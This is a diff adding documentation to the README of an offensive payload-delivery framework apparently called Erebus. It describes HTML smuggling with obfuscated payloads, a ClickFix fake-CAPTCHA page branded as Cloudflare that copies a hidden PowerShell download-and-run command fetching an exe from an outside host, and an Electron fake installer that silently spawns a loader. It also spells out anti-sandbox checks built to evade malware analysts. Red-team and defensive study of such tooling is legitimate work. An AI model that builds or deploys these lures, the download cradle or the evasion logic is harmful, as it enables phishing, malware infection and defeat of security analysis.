@@ -34,7 +34,10 @@ Create execution triggers for payloads:
 - **LNK Triggers** - Windows shortcut files (.lnk)
 - **BAT Triggers** - Batch script files (.bat)
 - **MSI Triggers** - MSI installer triggers
+- **MSC Triggers** - Windows Management Console snap-in triggers (Explorer-activated)
 - **ClickOnce Triggers** - ClickOnce application triggers
+- **HTML Smuggling** - Self-contained HTML page with XOR+base64 obfuscated payload dropped via in-browser Blob
+- **ClickFix** - Fake CAPTCHA page that copies a command to clipboard and walks the victim through Win+R → Ctrl+V → Enter
 
 #### 📦 Container Plugins  
 Package payloads into container formats:
@@ -42,6 +45,7 @@ Package payloads into container formats:
 - **ISO Containers** - ISO disk images with autorun support
 - **MSI Containers** - Windows Installer packages
 - **ClickOnce Containers** - ClickOnce deployment packages
+- **Electron Fake-Installer** - Single portable .exe wizard (Next/Install/Finish) that extracts the embedded loader to `%TEMP%` and spawns it hidden + detached
 
 #### 🛠️ Payload Plugins
 Manipulate or generate payloads:
@@ -100,6 +104,56 @@ Creates ClickOnce application triggers.
 
 **Functions:**
 - `create_clickonce_trigger()` - Generate ClickOnce deployment trigger
+
+#### MSC Trigger Plugin
+Creates Windows Management Console snap-in (.msc) triggers. MSC files are activated by Explorer/mmc.exe and can chain execution of the loader binary.
+
+**Functions:**
+- `create_msc_explorer_trigger()` - Generate MSC snap-in that spawns the payload
+
+#### HTML Smuggling / ClickFix Plugin
+Single plugin (`plugin_trigger_html_smuggling.py`) providing two browser-delivered triggers. Both produce fully self-contained `.html` files that can be hosted on any webserver or dropped via a phishing link.
+
+**Functions:**
+- `create_html_smuggling_trigger()` - Build an HTML smuggling page with the loader XOR-obfuscated and base64-encoded in JS. A JavaScript decoder reverses both layers at runtime and reconstructs a `Blob`, triggering the browser download without the encoded payload appearing in static HTML scans.
+- `create_clickfix_trigger()` - Build a ClickFix lure page mimicking a CAPTCHA/verification dialog. Clicking the verify button silently copies the configured command (typically a PowerShell download cradle) to the clipboard; on-screen instructions walk the victim through Win+R → Ctrl+V → Enter to execute it.
+
+**HTML Smuggling Features:**
+- XOR key is randomly generated per build (16 bytes) so no two payloads share a decoder footprint
+- Random JS variable identifiers break signature-based detection
+- Optional auto-download delay (default 1500ms) to look like a natural redirect
+- Configurable page title, heading, body text, and download filename (malleable lure content)
+
+**ClickFix Features:**
+- Malleable branding: `brand_name`, `brand_color`, heading/message, per-step instruction text, button label
+- Command string is escaped for safe JS embedding and copied via `navigator.clipboard.writeText`
+- Works on all modern browsers (Chromium, Firefox, Safari) without requiring any plugins or downloads
+- No binary artifact leaves the browser - evades file-based AV entirely; the command executes via user-initiated Run dialog paste
+
+**Example Usage:**
+```python
+# HTML smuggling - drop erebus.exe via Blob download
+html_path = create_html_smuggling_trigger(
+    payload_path="./payload/erebus.exe",
+    output_filename="invoice-viewer.html",
+    download_name="Invoice-Q4.exe",
+    page_title="Invoice Viewer",
+    heading="Loading invoice...",
+    auto_download=True,
+    delay_ms=2000,
+    payload_dir=Path("./payload"),
+)
+
+# ClickFix - clipboard-lure PowerShell cradle
+clickfix_path = create_clickfix_trigger(
+    command='powershell -w hidden -ep bypass -c "iwr -uri https://cdn.example/upd -outfile $env:TEMP\\u.exe; & $env:TEMP\\u.exe"',
+    output_filename="verify.html",
+    brand_name="Cloudflare",
+    brand_color="#f38020",
+    verification_heading="Verify you are human",
+    payload_dir=Path("./payload"),
+)
+```
 
 ### Container Plugins
 
@@ -167,6 +221,108 @@ Creates ClickOnce deployment packages.
 
 **Functions:**
 - `build_clickonce()` - Generate ClickOnce application package
+
+#### Electron Fake-Installer Container Plugin
+Wraps the compiled loader inside a single portable Windows `.exe` built with `electron-builder`. At install time the wizard presents a Welcome → Installing → Finish flow, extracts the embedded loader tree to `%TEMP%\inst-<uuid>`, spawns the configured entry point hidden + detached, and cleans up the temp dir when the child exits.
+
+**Functions:**
+- `build_electron_installer()` - Stage the payload into the Electron project's `extraResources`, rewrite `package.json` + `electron-builder.yml` with operator metadata, convert the icon to multi-size ICO, and produce the final portable exe
+
+**Two build modes:**
+- **In-Container (Wine)** - `npm install` + `electron-builder --win nsis` run inside the Erebus Docker container under wine (for rcedit/winCodeSign). One-step build, no Windows host required.
+- **Deferred (Erebus.Helper)** - the builder stages the Electron project source + `build_electron.bat` into the payload directory. The operator runs the bat on a Windows host with Node.js 20 via `python erebus_helper.py electron ...`.
+
+**Runtime behavior (wizard flow):**
+- Victim double-clicks the portable `.exe`; Electron runtime extracts to temp and launches the fake wizard with the Install button **disabled**
+- Renderer waits for the configured dwell time AND a real `mousemove` (non-zero movementX/Y) before acquiring a one-shot interaction token from the main process via `installer:ready`
+- Once the token is in hand, the Install button becomes actionable
+- "Install" click invokes `installer:run` with the token; the main process handler:
+  1. Re-validates the interaction token (rejects direct IPC invocation that bypasses the UI)
+  2. Runs `runGuardrails()` — debugger / sandbox env / username / hostname / screen / CPU / RAM / idle-time / pre-spawn delay checks
+  3. **Only if both gates pass**, copies `process.resourcesPath/payload/` to `%TEMP%\inst-<uuid>`
+  4. Spawns the configured entry point via `child_process.spawn(..., { detached: true, windowsHide: true, stdio: 'ignore' })`
+  5. Advances the wizard to Finish (guardrail failure is silent — wizard still shows fake progress + Finish, but nothing is copied or spawned)
+  6. Removes the temp dir on the spawned process's `exit` event
+
+**Guardrails (anti-sandbox gating):**
+All guardrails are operator-configurable via the `3.E9*` BuildParameter group and implemented in [src/guardrails.js](Payload_Type/erebus_wrapper/erebus_wrapper/agent_code/Erebus.Loaders/Erebus.Electron/src/guardrails.js). The master switch is `3.E9 Enable Electron Guardrails` (default: on).
+
+| Check | BuildParameter | Default | Behaviour |
+|---|---|---|---|
+| Dwell time | `3.E9a Dwell Time (ms)` | `2500` | Install button disabled until N ms have elapsed since the wizard opened |
+| Mouse movement | `3.E9b Require Mouse Movement` | on | Requires a real non-zero-delta `mousemove` inside the window before Install is actionable |
+| Debugger | `3.E9c Check Debugger` | on | Rejects if `inspector.url()`, `--inspect` arg, or non-zero `process.debugPort` |
+| Sandbox env vars | `3.E9d Check Sandbox Env Vars` | on | Rejects on `SBIEHOME`, `CUCKOO_AGENT`, `JOEBOX_AGENT`, `ANALYST_USERNAME`, `SANDBOXIE_CURRENT_DIR` |
+| Bad usernames | `3.E9e Check Default Bad Usernames` | on | Rejects common sandbox usernames (`sandbox`, `malware`, `analyst`, `WDAGUtilityAccount`, etc.) |
+| Bad hostnames | `3.E9f Check Default Bad Hostnames` | on | Rejects hostnames containing `sandbox`, `cuckoo`, `vbox`, `qemu`, etc. |
+| Hostname whitelist | `3.E9g Hostname Whitelist` | empty | Comma-separated allow-list; only matching hosts can run |
+| Hostname blocklist | `3.E9h Hostname Blocklist` | empty | Comma-separated deny-list |
+| Username whitelist | `3.E9i Username Whitelist` | empty | Comma-separated allow-list |
+| Username blocklist | `3.E9j Username Blocklist` | empty | Comma-separated deny-list |
+| Min screen width/height | `3.E9k`/`3.E9l` | `1280`/`720` | Defeats sandbox VMs that run at 800×600 or 1024×768 |
+| Min CPU count | `3.E9m Min CPU Count` | `2` | Defeats 1-CPU sandbox VMs |
+| Min RAM (MB) | `3.E9n Min Memory (MB)` | `2048` | Defeats low-memory sandbox VMs |
+| Max idle seconds | `3.E9o Max Idle Seconds` | `0` (off) | Rejects if system has been idle > N seconds (unattended box = suspicious) |
+| Pre-spawn delay | `3.E9p Pre-Spawn Delay (ms)` | `0` (off) | Sleeps N ms after all checks pass but before the file copy — forces short-lived detonation windows to time out |
+
+Guardrail failures are **silent**: the wizard still shows fake progress → Finish so a sandbox observer sees a "successful" install with no actual loader execution. The loader tree is never written to `%TEMP%\inst-<uuid>` when any enabled check fails.
+
+**Supported entry formats:**
+- `exe` - `CreateProcess` on the embedded PE directly
+- `dll` - `rundll32.exe <dll>,<entry>` (configurable export name)
+- `xll` - `excel.exe /e <xll>` (Excel add-in activation path)
+
+**PE resource fields (Windows Properties → Details tab):**
+All fields are driven by build parameters and baked into the portable exe via electron-builder's rcedit pass:
+
+| Windows field | BuildParameter | Source |
+|---|---|---|
+| File description | `3.E7 Electron File Description` | `package.json.description` |
+| Product name | `3.E0 Electron Product Name` | `electron-builder.yml.productName` |
+| Product version | `3.E2 Electron Version` | `package.json.version` |
+| File version | `3.E2 Electron Version` | `package.json.version` |
+| Copyright | `3.E8 Electron Copyright` | `electron-builder.yml.copyright` |
+| Company | `3.E1 Electron Publisher` | `package.json.author` |
+
+**Icon customisation:**
+- Operators can upload a custom PNG/JPEG/GIF/BMP/WEBP/TIFF/**SVG** via `3.E6a Electron Custom Icon`
+- SVG inputs are auto-rasterized to 512×512 via `cairosvg` before Pillow conversion
+- Pillow produces a multi-resolution ICO (16/24/32/48/64/128/256) embedded in the final exe's PE resource table
+- When no upload is provided, the vendored Erebus icon is used
+
+**Dependencies:**
+- Node.js 20 LTS + npm (in the Erebus Docker image for In-Container mode)
+- `wine`, `wine32`, `wine64` (for electron-builder's rcedit/winCodeSign calls under Linux)
+- `Pillow` (PNG → ICO conversion)
+- `cairosvg` + `libcairo2` (SVG → PNG rasterization)
+- `electron` + `electron-builder` (vendored per-project via npm)
+
+**Example Usage:**
+```python
+installer = build_electron_installer(
+    build_path=Path(agent_build_path),
+    product="AcmeCorp Field Services 2024",
+    publisher="AcmeCorp Industries Ltd",
+    version="8.3.1",
+    arch="x64",
+    entry_format="exe",
+    entry_name="erebus.exe",
+    build_mode="In-Container (Wine)",
+    file_description="AcmeCorp Remote Assistance Installer",
+    copyright_str="(C) 2024 AcmeCorp Industries Ltd. All rights reserved.",
+    custom_icon_bytes=None,  # or raw PNG/SVG bytes from operator upload
+)
+```
+
+**erebus_helper CLI (deferred Windows build):**
+```
+# Build the Electron portable exe on a Windows host
+python erebus_helper.py electron --project-dir electron_src --output ErebusInstaller.exe --arch x64
+
+# Optional AuthentiCode signing via electron-builder's CSC_LINK
+python erebus_helper.py electron --project-dir electron_src --output ErebusInstaller.exe \
+    --sign-cert mycert.pfx --sign-password hunter2
+```
 
 ### Payload Plugins
 
